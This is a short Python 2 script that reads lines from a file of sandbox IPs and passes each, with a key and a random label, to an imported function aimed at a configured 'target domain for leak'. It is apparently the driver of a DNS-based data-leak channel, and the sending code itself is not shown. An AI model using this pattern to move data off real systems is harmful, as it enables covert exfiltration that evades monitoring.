import socket
import thread
import time
import random
import string
import re
from common_func import translateMessage, rec_split, rec_split2,randomword, readconfig

config = readconfig()
#Global config
key = config["key"]
target = config["target"]  #target domain for leak <YOUR_DOMAIN>
url_end = config["url_end"]
url_screenshot_end = config["url_screenshot_end"]
subdomain = config["subdomain"]
target_ip = config["target_ip"]

#local config
filename = 'sandbox_ip.txt'

if hasattr(socket, 'setdefaulttimeout'):
        socket.setdefaulttimeout(10)

    
i = 0
host = randomword(10)
with open(filename) as f:

        for line in f:
                i = i + 1
                if i > 5:
                        time.sleep(1)
                        i = 0

                #thread.start_new_thread( get_rev, (line, ) )
                print(line)
                #try:
                regex = re.compile(r"\W+")
                name = regex.sub("-", line)
                if len(name) > 3:
                    rec_split2(name, key, host, target, subdomain)
               # except:
               #     pass